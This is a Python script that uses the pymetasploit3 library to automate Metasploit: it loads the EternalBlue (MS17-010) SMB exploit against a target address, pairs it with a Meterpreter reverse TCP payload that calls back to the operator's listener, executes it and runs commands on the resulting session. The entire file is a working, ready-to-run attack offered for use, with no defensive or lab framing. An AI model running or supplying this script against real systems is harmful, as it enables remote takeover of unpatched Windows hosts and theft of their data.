from pymetasploit3.msfrpc import MsfRpcClient

# Launch the Metasploit RPC server
# msfrpcd -P kali2024 -S

# Connect to the Metasploit RPC server
client = MsfRpcClient('kali2024', server='127.0.0.1', port=55553)

# List available exploits
exploits = client.modules.exploits
print("Available exploits:")
for exploit in exploits:
    print(exploit)

# Use a specific exploit
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')

# Set options for the exploit
exploit['RHOSTS'] = '192.168.1.100'  # Replace with target IP
exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'

# Set payload options
payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.1.50'  # Replace with your IP
payload['LPORT'] = 4444

# Execute the exploit
exploit.execute(payload=payload)

# List active sessions
sessions = client.sessions.list
print("Active sessions:")
for session_id, session_info in sessions.items():
    print(f"Session {session_id}: {session_info['type']} on {session_info['session_host']}")

# Interact with a session (assuming session 1 exists)
if '1' in sessions:
    session = client.sessions.session('1')
    print(session.run_with_output('sysinfo'))

# Close the connection
client.logout()
